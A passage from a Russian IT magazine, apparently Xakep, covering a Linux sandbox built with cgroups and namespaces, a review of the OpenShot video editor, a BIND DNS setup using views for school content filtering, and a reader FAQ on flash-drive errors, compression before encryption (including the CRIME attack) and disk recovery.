 сятка различных контроллеров, наиболее полезные из них:
 •   blkio — устанавливает лимиты на скорость ввода-вывода;
 •  cpu — позволяет ограничить использование процессора;
 •  cpuset — привязывает группу процессов к определенному процессорному
    ядру;
 •  devices — открывает/закрывает доступ к определенным устройствам;
 •  freezer — позволяет замораживать процессы в группе;
 •  memory — устанавливает лимиты на использование оперативной памяти.

 Мы для простоты будем использовать только два контроллера: cpu и memory.
 Для начала создадим группу контроллеров:

 $ sudo cgcreate -g cpu,memory:/sandbox

 Далее установим лимиты. С памятью все просто, указываем прямым текстом
 128 Мбайт:

 $ sudo cgset -r memory.limit_in_bytes=128M sandbox

 С процессором дела обстоят несколько сложнее. Здесь необходимо указывать
 период процессорного времени в миллисекундах и квоту, выделенную группе
 процессов на этот период. Например, если мы хотим, чтобы наша группа про-
 цессов (приложение) получала доступ к процессорным ресурсам на одну деся-
 тую секунды каждую секунду, то нужно выполнить следующую команду:

 $ sudo cgset -r cpu.cfs_period_us=1000000
     -r cpu.cfs_quota_us=100000 sandbox

 Обрати внимание, что данная настройка относится только к одному процес-
 сору, то есть на двухъядерной системе приложение будет получать процес-
 сор в два раза реже, а на четырехъядерной — в четыре раза реже. Еще один
 момент: данная настройка вовсе не значит, что приложение получит 10% про-
 цессорной мощности, она всего лишь гарантирует, что приложение не будет
 получать доступ к процессору реже, чем мы указали. Если система простаи-
 вает, то планировщик может выделить приложению гораздо больше времени
 для работы.
   Ну и в завершение нам необходимо запустить наше приложение под управ-
 лением cgroups:

 $ sudo cgexec -g cpu,memory:/sandbox ip netns exec unshare -piumU
     --fork --mount-proc chroot ~/sandbox /bin/ls -l /

 Вуаля, мы получили полноценное виртуальное окружение, полностью отрезан-
 ное от основной системы, с ограничением ресурсов и выходом в сеть через
 виртуальный шлюз.

 СОБИРАЕМ ВСЕ ВМЕСТЕ
 Теперь, когда мы знаем, как создать песочницу, мы можем написать скрипт,
 который делает это все за нас. Вот он:





 Пользоваться скриптом очень просто. Достаточно просто указать имя прило-
 жения:

 $ sudo sandbox.sh ps

 Далее скрипт создаст выделенную песочницу в каталоге ~/sandbox, скопи-
 рует в него приложение и его зависимости, настроит сетевой мост и cgroups
 и запустит приложение, после чего удалит песочницу и сбросит настройки.
 Для простоты аргументы игнорируются. Также не пытайся с его помощью запу-
 стить сложный, а тем более графический софт, зависящий от файлов настроек
 и других данных, которые этот скрипт не умеет копировать в песочницу.

ВЫВОДЫ
 Ядро Linux имеет все необходимые средства для создания изолированных
 окружений исполнения. Те же самые технологии можно использовать для за-
 пуска не только отдельно взятых приложений, но и целых дистрибутивов.
 Для этого достаточно скопировать в каталог песочницы все файлы дистрибу-
 тива, смонтировать каталоги /dev и /proc, а затем запустить /bin/init.
   Ну а популярность Docker обусловлена всего лишь тем, что он позволил де-
 лать все это с помощью одной простой команды, без необходимости самому
 копировать зависимые библиотеки и возиться с настройками.
UNIXOID





                       РАЗБИРАЕМСЯ
                     С OPENSHOT
 САМ СЕБЕ
 РЕЖИССЕР





Бытует мнение, что для Linux полно видео-
редакторов, но нормальных среди них нет,
а потому эта система не подходит для обра-
                                                                               Мартин
                                                                                                             «urban.prankster»ботки видео. Спорить можно долго, но сле-
                                                                                   Пранкевич
                                                                                               prank.urban@gmail.comдует помнить, что все профессиональные
решения имеют свою, и немалую, цену, аб-
солютному же большинству пользователей обычно ну-
жен понятный в применении инструмент для обработки
«видео для YouTube». Некоторое время назад мы делали
обзор видеоредакторов под Linux. А сегодня остановим-
ся на одном из самых простых, но в то же время функцио-
нальном их представителе — OpenShot.

ПРОЕКТ OPENSHOT
Видеоредактор OpenShot особо представлять пользователям Linux не нуж-
но. Начат в августе 2008-го как проект одного человека — Джонатана Тома-
са (Jonathan Thomas), решившего с нуля создать инструмент для работы с ви-
део высокой четкости. Благодаря тому что Томас прислушивался к советам
пользователей, в OpenShot достигнут удачный баланс между возможностями
и простотой в применении. Поэтому буквально за два года он превратился
в решение, включаемое по умолчанию во многие дистрибутивы Linux, потес-
нив старичков Kdenlive, Cinelerra и Kino. И несмотря на то, что он изначально
рассчитан на персональное использование, OpenShot нередко применяется
при создании видеоклипов в полупрофессиональной среде.
   Интерфейс локализован, не перегружен настройками и интуитивно по-
нятен. Имея представление о сути процесса, очень легко найти то, что нуж-
но. Этот минимализм, кстати, и сбивает с толку новичков, которые считают его
слишком простым, а значит, малофункциональным. Хотя тут есть все необхо-
димые функции для редактирования видео (и даже больше): неограниченное
количество треков/слоев, клип (изменение размеров, масштабирование, зум,
обрезка, вращение, изменение скорости), видеоэффекты (яркость, гамма,
цветовой тон, оттенки серого), Key Frame анимация, наложение титров, суб-
титров и водяных знаков, видеопереходы, композиция, Telecine (уменьшение
и увеличение частоты кадров) и многое другое. Временная линия поддержива-
ет drag and drop, прокрутку, панорамирование, масштабирование и так далее.
Есть модуль анализа аудио (форма сигнала; спектральный анализ разрабаты-
вается). Возможен экспорт и импорт видео всех форматов, обеспечиваемых
FFmpeg (AVI, MPEG, DV, MOV, FLV, MP3 и других). OpenShot понимает и гра-
фические файлы, с последовательности которых можно генерировать видео
и вставлять в проект. Видео можно загружать на онлайн-видеосервисы вро-
де YouTube и Vimeo. При использовании Cheese OpenShot может работать
и с веб-камерой, сохраняя и обрабатывая потоковое видео.
   Установки OpenShot, проект, эффекты, субтитры, шаблоны экспорта, про-
фили описываются в XML/JSON/TXT-файлах, то есть их можно легко копиро-
вать и модифицировать под свои нужды, создавая новые настройки. Боль-
шинство 3D-эффектов и анимаций сделаны в Blender. В качестве основы
для заголовков и субтитров используются SVG-файлы. Для редактирования
эффектов и субтитров OpenShot интегрируется с Inkscape и Blender. Если
имеющиеся шаблоны не совсем подходят, то, чтобы их не править постоянно,
лучше создать свой, просто скопировав и подправив старый шаблон в соот-
ветствующем каталоге. Файлы можно создать самому или скачать с сервисов
вроде OpenClipart.
   Написан OpenShot на Python и PyQt5, бэкенд libopenshot — на C++ с ис-
пользованием FFmpeg. Чтобы придать интерактивность timeline, использова-
лись HTML5, JavaScript и AngularJS.

УСТАНОВКА OPENSHOT
Сегодня стабильная версия — 1.4, вышедшая ровно пять лет назад, она до-
ступна в основных репозиториях дистрибутивов. В Ubuntu ставится просто:

$ sudo apt install openshot

Но уже более пяти лет идет разработка версии 2.0, в которой используется но-
вый движок на C++, обеспечивающий лучшую производительность. На данный
момент на сайте доступна версия 2.0.7 (Beta 4), пока она считается в неста-
бильном статусе, но тем не менее работает уже достаточно хорошо. Во вся-
ком случае, проблем с бетой не было. Установить 2.0 можно из исходных тек-
стов, также доступна в виде AppImage, плюс есть репозиторий для Ubuntu.

$ sudo add-apt-repository ppa:openshot.developers/ppa
$ sudo apt update

По умолчанию Blender и Inkscape не устанавливаются, но они потребуются
при работе с титрами. Поэтому добавим и их:

$ sudo apt install openshot-qt inkscape blender

Запускаем из меню или в командной строке:

$ openshot-qt

Пользовательские установки и бэкап OpenShot хранит в ~./.openshot-qt,
файлы шаблонов, профилей, субтитров и прочие настройки — в каталоге /
usr/lib/python3/dist-packages/openshot_qt.  При  переносе  настроек
на другой ПК следует обязательно скопировать эти каталоги. Чтобы добавить
свой вариант оформления субтитров, достаточно положить SVG-файл в ката-
лог titles. Если нужны новые профили, то редактируем файлы в profiles, уста-
новки для экспорта проекта — в preset, эффекты — в effect и так далее. Де-
фолтные настройки проекта находятся в JSON-файлах в /usr/lib/python3/
dist-packages/openshot_qt/setting. В версии 1.4 OpenShot есть графи-
ческий редактор профилей, позволяющий на основе имеющихся настроек со-
здать свой, в 2.0 его убрали. Совсем или временно — неясно. Поэтому пока
единственный путь — редактировать файлы напрямую.





                            Настройки в OpenShot — это обычные XML/JSON-файлы


ИНТЕРФЕЙС OPENSHOT
Интерфейс второй версии и принцип работы по сравнению с 1.4 практиче-
ски не изменился. Да и вообще, те, кто раньше работал с любым видеоре-
дактором, быстро найдут все, что нужно. Команд немного, большинство так-
же выполняются при помощи горячих клавиш. Пропорции окон меняются
при помощи мышки, рабочая область подгоняется под любое разрешение
монитора, отдельные блоки разворачиваются или убираются. Из меню «Вид»
вызывается полноэкранный режим и устанавливается тип интерфейса (Simple
или Advanced). Во втором варианте на панель добавляются значки вызова эф-
фектов и переходов (в Simple они спрятаны за вкладками).
   Основные действия (такие как сохранение и вызов проекта, экспорт и им-
порт, отмена действий) производятся из основного меню и кнопок на панели.
Кнопки не подписаны, но, чтобы узнать назначение, достаточно навести мышку.
Так как эти команды используются редко, панель можно сразу убрать (Вид
Показать панель инструментов), освободив дополнительную рабочую область.
  На вкладке «Файлы проекта» показываются все добавленные в него видео,
аудио, графические файлы и созданные титры. В правой части — окно пред-
просмотра видео, внизу — треки временной линейки. Между ними — панель
инструментов, из которой выполняются все основные операции в timeline.
Для некоторых элементов также доступно контекстное меню, из него можно
вызвать нужную настройку и задать параметры.
   Настройки самого OpenShot находятся в меню «Правка   Параметры». Их
немного, и они понятны. Следует в Autosave установить по своим требованиям
интервал автосохранения проекта (по умолчанию три минуты). В Profiles зада-
ется профиль по умолчанию для всех проектов — чтобы не менять постоян-
но настройки, лучше сразу установить наиболее подходящий. В General вы-
бирается тема оформления по умолчанию и время (по умолчанию), в течение
которого будут отображаться импортированные в проект субтитры, эффекты
и изображения. Их в проекте можно задать затем индивидуально. По умолча-
нию здесь десять секунд, это много, и приходится постоянно править. Лучше
установить в пределах двух-трех секунд. Хотя в 2.0, чтобы его изменить, уже
не нужно лезть в меню.

НАЧИНАЕМ РАБОТУ
После запуска программы создается безымянный проект, настройки которо-
го будут сохраняться в ~./.openshot-qt/backup. Лучше сразу сохранить про-
ект под нужным именем в отдельный каталог. Проект состоит из JSON-файла
с расширением .osp и подкаталога thumbnail (может быть общим для несколь-
ких проектов). Добавляем файлы в проект перетаскиванием или через меню
«Файл   Импортировать файлы» (Ctrl + F), после чего в окне появятся эскизы.
В версии 1.4 картинки добавлялись через специальное меню, теперь весь им-
порт находится в одном месте. Когда файлов много и выбрать нужный тяжело,
можно переключаться по фильтрам (видео, звук, изображение). В контекстном
меню доступны пункты «Details View» (Ctrl + D) и «Миниатюры» (Ctrl + I), позво-
ляющие изменить представление файлов проекта.
   Используя мышку или пункт контекстного меню «Добавить на шкалу вре-
мени» (Ctrl + A), переносим файлы на трек. Оба этих метода имеют отличия.
При перетаскивании мы сами помещаем файл в нужное место, а затем настра-
иваем из контекстного меню. В случае использования меню появляется окно
настройки, в котором необходимо будет указать трек, время на треке, куда по-
местить файл, установить эффекты и масштаб. Иногда это проще и точнее.





                                                         Добавляем эффект


По умолчанию в проекте пять треков (0–4). Объекты на треках с большим номе-
ром перекрывают нижние. Поэтому титры, водяные знаки, эффекты и PiP-ви-
део (картинка в картинке) следует помещать на треки с большим номером.
   Переходы и эффекты можно как располагать на отдельном треке, так и на-
кладывать на самом ролике. В первом случае они будут работать для всех, что
лежат ниже, во втором — для конкретного клипа. При этом некоторые эффекты
и переходы нельзя поместить на пустую дорожку, только применить к конкрет-
ному видео. О том, что к видео применен эффект или переход, говорит по-
явление небольшого значка с буквой В или С в левом верхнем углу. Щелкнув
по нему, можем вызвать контекстное меню настройки эффекта. Для удобства
перемещения по важным точкам проекта на timeline устанавливаются марке-
ры. Просто переходим в нужное место и нажимаем кнопку на средней панели.
В дальнейшем между маркерами можно перемещаться при помощи стрелок.





                              Объекты на верхних дорожках перекрывают нижние


Если выбрать любой объект на timeline, слева в окне «Свойства» будут пока-
заны все его параметры (расположение, вращение, масштаб), большинство
из них можно редактировать. Здесь же включается просмотр графика громко-
сти. Эффект на timeline подсвечивается другим цветом.
   Чтобы изменить расположение файла на дорожке или между дорожками,
просто захватываем его и перетаскиваем по временной линейке. К сожале-
нию, в версии 2.0 пропала (надеюсь, не насовсем) возможность перемеще-
ния трека вверх-вниз. При помощи контекстного меню в заголовке трека мож-
но его удалить, переименовать и добавить новый трек до или после текущего.
Но вот в контекстном меню в рабочей области трека (его также можно вызвать
щелчком по треугольнику в начале трека) есть пункты, позволяющие скопиро-
вать клип, эффекты или ключевые кадры и перенести на другой трек. Контекст-
ное меню предоставляет еще один способ применения эффектов для видео:
здесь можно выбрать тип (затемнение, вращение, расположение) и быстро
его настроить. В меню также отключается или приглушается звук и изменяется
скорость клипа.
   Сделать PiP в OpenShot очень просто: выбираем видео, а затем в кон-
текстном меню «Расположение» указываем, куда его поместить. Доступно не-
сколько предустановок, например 1/4 экрана по центру, сверху справа/слева,
снизу справа/слева. Это позволяет быстро поставить картинку в нужное ме-
сто. При необходимости, использовав пункт меню «Вращение», можем повер-
нуть выбранное видео на угол, кратный 90. Более тонкое вращение, масштаб
и прочие характеристики настраиваются в свойствах.





                                               Размещаем несколько видео


В версии 1.4 для разделения клипа использовалась так называемая «бритва».
Теперь эту операцию можно выполнять только из контекстного меню, пункт
«Нарезать клип». Причем здесь три варианта: можно сохранить обе части или
сразу убрать из проекта левую или правую. Разделенное видео затем можно
перемещать на другие треки, обрабатывая отдельно. Для более точной резки
файла следует растянуть временную линию при помощи ползунка «Увеличить/
уменьшить» справа от кнопок.

ДОБАВЛЯЕМ ЗАГОЛОВОК
Титры, как и водяные знаки, — это файлы в формате SVG или XML (3D), кото-
рые после создания сохраняются в отдельной папке и автоматически добавля-
ются к проекту. Подпись или заголовок создаются в отдельном меню «Заголо-
вок» (раньше он назывался «Титры», что мне кажется более удачным). В меню
два пункта: «Заголовок» (Ctrl + T) и «Animated Title» (анимированные титры, Ctrl
+ В). Выбираем нужный, после чего появляется редактор титров. Здесь нужно
указать шаблон, ввести текст в предложенные поля, выбрать шрифт и цвет тек-
ста и фона. Доступен предпросмотр. После сохранения новый заголовок по-
явится в файлах проекта, просто перемещаем его в нужное место на timeline
и, если требуется, редактируем, вызвав контекстное меню. В меню доступны
те же пункты, что и для видео, то есть заголовок можем вращать, масштабиро-
вать, анимировать и так далее.
   Для анимированных титров установок чуть больше, необходимо еще на-
строить эффекты. Для каждого шаблона они будут свои, просто подбираем то,
что хотим, и смотрим результат. Если понадобится более продвинутое редак-
тирование (изменить расположение, размер, форму), то следует нажать «Ис-
пользовать продвинутый редактор» или «Обработчик». В первом случае запу-
стится Inkscape, во втором — Blender. После сохранения файла он также будет
добавлен к проекту. Если часто приходится вызывать продвинутый редактор,
то лучше сразу подготовить новый шаблон и поместить его в каталоги, о кото-
рых говорилось выше. Это существенно ускоряет работу над проектом.
  С водяными знаками все просто. Создаем прозрачную картинку с нужной
подписью (можно для этого использовать пункты меню «Заголовок»), ставим
ее на самый верхний уровень и растягиваем мышкой на всю продолжитель-
ность. Это все. В результате после экспорта проекта все, что есть на картинке,
будет помещено на видео.





                                         Добавляем анимированный заголовок


СОХРАНЯЕМ РЕЗУЛЬТАТ
Когда проект готов, результат можно экспортировать в видеофайл, разложить
на последовательность изображений или загрузить на видеохостинг. Весь
процесс регулируется одной кнопкой «Экспортировать видео»: после ее нажа-
тия появляется окно настроек экспорта, в котором указываем имя файла, вы-
бираем профиль, кодек, устанавливаем качество (низкое, среднее, высокое).
Во вкладке «Дополнительно» все параметры экспорта настраиваются более
тонко. Подтверждаем и ждем окончания процесса.





                                                     Настройка экспорта видео

ВЫВОД
Как видим, OpenShot достаточно мощное и гибкое приложение для редакти-
рования видео с простыми настройками. Осваивается он очень быстро, ка-
ких-либо сюрпризов при работе не преподносит, а результат выглядит не хуже
полученного в коммерческих редакторах. Если же возможностей OpenShot по-
казалось недостаточно, то самое время присмотреться к Lightworks.
SYNACK





         ОПЫТ НАСТРОЙКИ
          И ЭКСПЛУАТАЦИИ
            DNS-СЕРВЕРА





                                       Александр «Plus» Рак
                                                Участник сообщества
                                         OmskLUG. Руководитель
                                             группы автоматизации
                                              отдела ИТ департамента
                                                образования, город
                                                 Салехард
                                                plus@omsklug.com





Сегодня невозможно представить себе интернет без
DNS. Однако многие администраторы не уделяют время
настройке этой службы на своих серверах, поэтому не ис-
пользуют всю ее мощь даже на треть.


ИТАК, ПЛАНЫ НА СЕГОДНЯ!
1. Настройка зоны мастер.
2. Подключение зон в слейве.
3. Каждому свое. Настраиваем параметры в зависимости от адреса клиента,
   с которого пришел запрос.
4. Подключаем внешний DNS-фильтр.





                                                Пример описания зоны DNS

ИНТРО
Когда я устроился на работу, количество сервисов в нашей сети можно было
пересчитать по пальцам одной руки. Время шло, число сервисов росло. Об-
служивающий DNS-сервер был один и выступал мастером для одной зоны (на-
зовем ее xak.ru). Все остальные запросы он просто пересылал на DNS-сервер
Google (8.8.8.8). А, чуть не забыл добавить: сервер этот был виртуальным. По-
том в один прекрасный день сервер рухнул физически. После замены систему
подняли, виртуализацию прикрутили. Поставили свежеустановленный Debian
и к нему BIND 9. Присвоили тот же IP, что был у DNS-сервера до падения. На-
стройки восстановили из бэкапа. После успешного старта стали думать, как
«закручивать болты».
   Параллельно с этой работой был установлен хостинг, который держал на
себе зону (например) xaker.ru. Само собой, центральный DNS должен о ней
знать, а еще лучше быть slave DNS-сервером для этой зоны. Далее возникла
необходимость перенаправлять DNS-запросы от центрального сервера к ре-
директору в зависимости от того, из какой сети пришел запрос. Делалось это
ради подключения внешних DNS-фильтров, но не для всех. А только для тех,
кому надо, а именно образовательных городских сетей — территории образо-
вательных учреждений! Обо всем этом и пойдет речь ниже.

НЕМНОГО ТЕОРИИ
Основная цель DNS — это отображение доменных имен в IP-адреса и на-
оборот — IP в DNS. Решено было рассмотреть BIND (Berkeley Internet Name
Domain, ранее Berkeley Internet Name Daemon), как самый распространенный
софт для решения задачи DNS. BIND входит в состав любого дистрибутива
UNIX. Основу BIND составляет демон named, который для своей работы ис-
пользует порт UDP/53 и для части запросов TCP/53. Очень подробно о нем
рассказано в статье на Хабре.
   Если хочешь познакомиться с «новым» BIND, то рекомендую к чтению вот
эту статью. В двух словах: версия 9 была последней, с 10-й версии права пе-
редают сообществу, и это ПО ныне известно как Bundy.

БЫСТРАЯ УСТАНОВКА, ИЛИ ЕЩЕ РАЗ ОБ ОДНОМ И ТОМ ЖЕ
Итак, как установить BIND 9 в Debian/Ubuntu, в Сети очень и очень много мате-
риала. Так что быстро пройдемся по этому пункту, не вдаваясь в подробности.
Для начала необходимо установить BIND 9 в систему. Для пользователей MS
Windows есть версия BIND 9 под их платформу.

$ sudo apt install bind9





                                                                apt-cache search bind9

Для других дистрибутивов руководств по сборке из исход-
ных кодов на просторах Сети предостаточно, забирай бы-
стрее, переписывай в блокноты, пока новый «суперполез-
ный» закон не накрыл весь интернет или пока тебя не
отругали за то, что ты ходишь или ходил на сайт с запрещен-
ной литературой. ;)                                                          INFO
   После установки переходим в каталог /etc/bind9/ и ви-
дим там основной файл конфигурации named.conf, внутри       Подробно о
подключены остальные файлы named.conf.*. Как настра-       версии для
                                                                           Windows 2008ивать мастер-зону, опустим, поскольку в Сети информа-                                                                      можно почитать
ция изложена очень подробно. Добавим в файл named.conf        тут: «Установка
строку                                                                 BIND 9 в Windows
                                                                                       Server 2008».
include "/etc/bind/named.conf.acl";

чем подключим новый файл в конфиг для правил подсетей. Далее создаем
файл /etc/bind/named.conf.acl и добавляем правила:

acl "lan" { 192.168.181.0/24; };
acl "do" { 10.0.0.0/24; 192.168.253.0/24; };
acl "srv" { 192.168.254.0/24; };
acl "alls" { 10.10.0.0/16; };
acl "dou" { 192.168.201.0/24; 192.168.202.0/24; 192.168.203.0/24;
    192.168.204.0/24; 192.168.205.0/24; };
acl "school" { 172.16.0.0/24; };

Здесь мы разделили сети на группы для дальнейшей обработки. Прежде чем
продолжим, уточню один момент. Для корректной обработки зон необходимо
в каждую группу правил добавлять все зоны. Можно это делать в одном файле
или вынести настройки зоны в отдельный файл и потом просто подключать в
нужных местах. Итак, в файл /etc/bind/named.conf.local вносим изменения:

view "edu" {
    match-clients { school; };
    recursion yes;
    allow-query { school; };
    forwarders { 77.88.8.7; };
    zone "xaker.ru" {
        type master;
           file "/etc/bind/xaker.ru_loc";
    };
    zone "254.168.192.in-addr.arpa." {
        type master;
           file "/etc/bind/xaker.rev";
    };
    zone "zone2.ru" {
        type slave;
           file "/etc/bind/db.zone2.ru";
        masters { 192.168.254.5; };
    };
};

Здесь мы обозначаем группу, с которой будет работать BIND. Добавляем сюда
клиенты из правил, которые мы определили выше. Назначаем вышестоящий
сервер, на который будут пересылаться запросы, пришедшие из сетей, со-
гласно описанным правилам. Здесь это единственная группа адресов School.
В качестве вышестоящего DNS задал DNS-сервер Яндекс, который фильтрует
«плохой» контент. Можно аналогично использовать другие DNS-сервисы, та-
кие как SkyDNS.
   Далее в этот же файл ниже добавляем вторую или остальные группы кли-
ентов. Зона zone2.ru подключена как slave-зона, указан DNS-мастер-сервер и
файл — путь к базе.

view "any" {
    match-clients { any; };
    notify yes;
    recursion yes;
    allow-query { do; lan; srv; dou; };
    forwarders { 8.8.8.8; };
    zone "xaker.ru" {
        type master;
           file "/etc/bind/xaker.ru_loc";
    };
    zone "254.168.192.in-addr.arpa." {
        type master;
           file "/etc/bind/xaker.rev";
    };
    zone "zone2.ru" {
        type slave;
           file "/etc/bind/db.zone2.ru";
        masters { 192.168.254.5; };
    };
    zone "server.local" {
        type master;
           file "/etc/bind/server.local_loc";
    };
};

Здесь мы снова перечисляем, какие группы входят в эту секцию правил или,
говоря иначе, каким сетям отвечать. Настройки зон могут быть различными.
Если необходимо обеспечить доступ в зону xaker.ru, то эту секцию нужно опи-
сывать в обеих секциях. Зона server.local описана только во второй части. Это
говорит о том, что доступ к ней есть только у группы адресов, описанных в этой
секции конфига. Это полезно использовать для обеспечения доступа, напри-
мер, к зоне серверов или закрытых внутренних сервисов, порталов и прочего
только необходимых клиентов. Как видно из конфига, вышестоящий DNS-сер-
вер здесь другой. Таким образом, можно подключать внешние DNS-фильтры
для избранных.
  В общем файле настроек /etc/bind/named.conf.options описываем
только недостающие параметры.

options {
    directory "/var/cache/bind";
    dnssec-validation auto;
    auth-nxdomain no; # conform to RFC1035
    listen-on-v6 { any; };
    version "Xaker DNS Master Server";
    listen-on-v6 { none; };
    notify yes;
    forward first;
    listen-on port 53 { 127.0.0.1; 192.168.254.2; };
};

Эти правила можно отключить и прописать для каждой группы. Учти, что в та-
ком случае параметры нужно прописывать в каждой секции, у нас их две. Фай-
лы зон описываются при этом стандартно.

$TTL    86400
@       IN      SOA     xaker.ru. root.xaker.ru. (
    2015021902 ; Serial
    1d ; Refresh
    12h ; Retry
    1w ; Expire
    3h ; Minimum
);
        IN      A       192.168.0.6
*       IN      A       192.168.0.6
@       IN      NS      xaker.ru.
@       MX      5       192.168.0.3
mail    MX      10      192.168.0.3
mail    IN      A       192.168.0.3
pop     IN      A       192.168.0.3
smtp    IN      A       192.168.0.3
imap    IN      A       192.168.0.3
ns1     IN      A       192.168.0.3
www     IN      CNAME   @
jabber  IN      A       192.168.0.3
_xmpp-server._tcp.proxy.jabber.xaker.ru 86400 IN SRV 0 5 5222
    jabber.xaker.ru

Здесь все стандартно. Описываем зону. Если нужно, MX-записями задаем
узлы для работы с почтой. Последней строчкой мы описываем XMPP-сервер
для передачи файлов с поддержкой Jabber-прокси. Без этого файлы между
сетями, находящимися за шлюзом, передавались нестабильно.
   Для того чтобы не описывать одинаковые зоны по несколько раз, можно
вынести их в файл, например, zone-share.conf. Внутри описать общие зоны,
которые будут использоваться во всех группах:

zone "xaker.ru" {
    type master;
     file "/etc/bind/xaker.ru_loc";
};
zone "254.168.192.in-addr.arpa." {
    type master;
     file "/etc/bind/xaker.rev";
};
zone "zone2.ru" {
    type slave;
     file "/etc/bind/db.zone2.ru";
    masters { 192.168.254.5; };
};
zone "server.local" {
    type master;
     file "/etc/bind/server.local_loc";
};

А в файле /etc/bind/named.conf.local после описания параметров и перед
подключением настроек зон подключить файл с настройками:

include "/etc/bind/zone-share.conf";

А уже потом описывать зоны, которые будут обрабатываться только для этих
клиентов, описанных в данной секции конфига.

ИТОГ
Как видно, совсем не сложно разбить клиенты DNS на группы сетей или от-
дельные узлы и обрабатывать их запросы или перенаправлять вышестояще-
му DNS-серверу в зависимости от адреса, с которого пришел запрос. Чтобы
наши клиенты НЕ СМОГЛИ использовать внешние DNS-серверы на выходном
шлюзе, добавляем правило «Разрешить DNS-запросы в интернет от ваших
DNS-серверов и запретить для всех остальных». Делается это из-за того, что
есть знающие пользователи, которые меняют настройки на своих устройствах.
Или просто заворачиваем все запросы на наш DNS. Следует отметить, что
если используется прокси, то для его клиентов запросы будет обрабатывать
прокси-сервер, это нужно учитывать.
   Служба DNS не менее важна, чем DHCP и другие. При правильном подходе
она помогает решить довольно большой круг задач. Игнорируя этот сервис,
перекладывая все заботы на публичные DNS-серверы, администраторы лиша-
ют себя очень гибкого инструмента для работы с сетью. Так, например, можно
снизить нагрузку на канал, если описать зоны с сервисами, находящимися в
локальной сети и имеющими доступ из сети Интернет, чтобы внутренние кли-
енты ходили только по локальной сети, а клиенты внешние — через внешний
канал соответственно. Когда число клиентов переваливает за сотню, это осо-
бенно ощутимо.
   P. S. Всем удачи! Легкой настройки, бесперебойной работы и свободного
канала связи :)
FAQ



                                         Алексей Zemond
                                            Панкратов
                                            3em0nd@gmail.com

FAQ
   ОТВЕТЫ НА ВОПРОСЫ
       ЧИТАТЕЛЕЙ

               (ЕСТЬ ВОПРОСЫ? ШЛИ НА FAQ@GLC.RU)





КАК ПОБОРОТЬ ОШИБКУ 0X80070570 ПРИ КОПИРОВАНИИ ФАЙЛОВ
НА ФЛЕШКУ
Если ты копируешь файлы на Flash-накопитель, а Windows жалуется на ошибку
с загадочным номером, то не торопись ругаться и выбрасывать флешку в му-
сор. Возможно, ее еще можно спасти. Сейчас расскажу, что для этого нужно
делать.
   Если сообщение появляется именно при копировании файлов, значит, тра-
бла связана с ошибками файловой системы носителя. Лечится это на удивле-
ние просто. Открываем свойства носителя и, перейдя на вкладку «Сервис»,
нажимаем кнопку «Проверить». В появившемся окне необходимо выставить
галочку «Автоматическое исправление ошибок» и запустить процесс.
   После окончания операции
система исправит все найден-
ные ошибки, и на флешку можно
будет переносить данные.
   Второй  возможный  вари-
ант — сообщение об ошибке
с таким номером появляется
при установке Windows. В этом
случае за номером 80070570
могут скрываться целых три раз-
ных проблемы:
•  поврежденные файлы
   на установочном носителе,
   диске или флешке;
•  неисправность оперативной
   памяти;
•  неисправность жесткого
   диска.

Для начала попробуй записать
образ заново, взяв другую про-
грамму для записи. Если это
не сработает, то, по крайней
                                             Проверка диска на наличие ошибокмере, ты будешь знать, что дело
не в ошибках чтения. Для про-
верки памяти можешь взять тот же memtest86+, ну а для проверки диска подой-
дет любая читалка параметров SMART.
   Если выявить проблему так и не удалось, то остается сделать низкоуровне-
вое форматирование диска через любой дистрибутив Live CD. И на всякий слу-
чай обнови версию прошивки BIOS — в редких случаях помогает именно это.

КАК ГРАМОТНО СОЧЕТАТЬ СЖАТИЕ И ШИФРОВАНИЕ
Если у тебя есть некий массив ценных данных, которые ты бы хотел сохранить
в зашифрованном виде, то первым делом перед тобой встает вопрос: что сна-
чала — шифровать или архивировать? Ответ на самом деле однозначный —
архивировать после шифрования нет никакого смысла.
  Зашифрованный файл уже не сожмется, ведь после работы криптографи-
ческого алгоритма пригодные для сжатия участки упорядоченной информации
пропадут. Но вот интересный факт: существует случай, когда сжимать перед
шифрованием вообще не рекомендуется.
   Речь об уязвимости под названием CRIME (Compression Ratio Info-leak Made
Easy). Если атакующий имеет возможность контролировать часть шифруемых
данных, а также инициировать процесс сжатия и получать доступ к результату,
то он сможет восстановить оставшуюся, неизвестную ему часть получившего-
ся файла. Отправляя дублирующиеся данные, он способен влиять на содер-
жащийся в архиве словарь и наблюдать изменения размера архива. Именно
по размеру и вычисляются секретные данные.


                                                                   CRIME





Сфера применения CRIME — подбор секретных cookie, передаваемых по про-
токолам HTTPS и SPDY, и перехват сессии. Так что если ты шифруешь свой
суперважный архив, можешь ничего не бояться и предварительно сжать его.
Но если ты мастеришь какую-то автоматизированную систему, помни, что эко-
номить килобайты лучше не в ущерб безопасности.

ЧТО ДЕЛАТЬ, ЕСЛИ ЖЕСТКИЙ ДИСК ВДРУГ ПЕРЕСТАЛ РАБОТАТЬ
Представь такую крайне неприятную ситуацию: ты включаешь компьютер,
а операционка жалуется, что жесткий диск не читается. Что делать? Можно,
к примеру, принести ягненка в жертву компьютерным богам, станцевать риту-
альный танец, поставить свечку в храме или даже вызвать мастера по объяв-
лению в подъезде. Но давай лучше сосредоточимся на более конструктивных
методах.
   Итак, первый и главный вопрос: определяется ли диск в BIOS? Если нет, то
нужно проверить, не отходят ли кабели, и, если у тебя есть кредл для диска,
на всякий случай попробовать подключить через него — иногда это помогает.
Если ничто не сработало, то остается нести винт в лабораторию восстановле-
ния данных.
   Если же диск виден, но файловая система неверная, то тут уже можно ко-
е-что предпринять. Для начала раздобудь какой-нибудь Live CD и проверь па-
раметры SMART диска. В той же Ubuntu это делается штатными средствами.
Если видишь, что дело плохо, будь осторожен и не инициируй лишних операций
с диском — он может совсем рассыпаться в любой момент.
   Если прямой угрозы нет, снимай образ. Это можно сделать в той же Ubuntu
с помощью утилиты dd). Если с командной строкой не дружишь, то подойдет тот
же Acronis True Image.
   Когда у тебя есть рабочий образ диска, можешь приниматься вытаскивать
из него данные. Программ для этого великое множество — есть и платные,
и бесплатные. Из наиболее известных платных рекомендую R-Studio — она от-
лично себя зарекомендовала и нередко выручает в тяжелых ситуациях. Из бес-
платных ничего лучше, чем Recuva, я не встречал.
   Ну и конечно, рекомендую почаще делать резервные копии важных файлов
или синхронизировать их с облаком. А если беда все же произошла, не паникуй
и один за другим спокойно пробуй все возможные методы возвращения диска
к жизни.

ДЕЛАЕМ АВТОМАТИЧЕСКУЮ СИНХРОНИЗАЦИЮ ФАЙЛОВ ПО СЕТИ
Держать синхронизированные копии файлов или каталогов на разных маши-
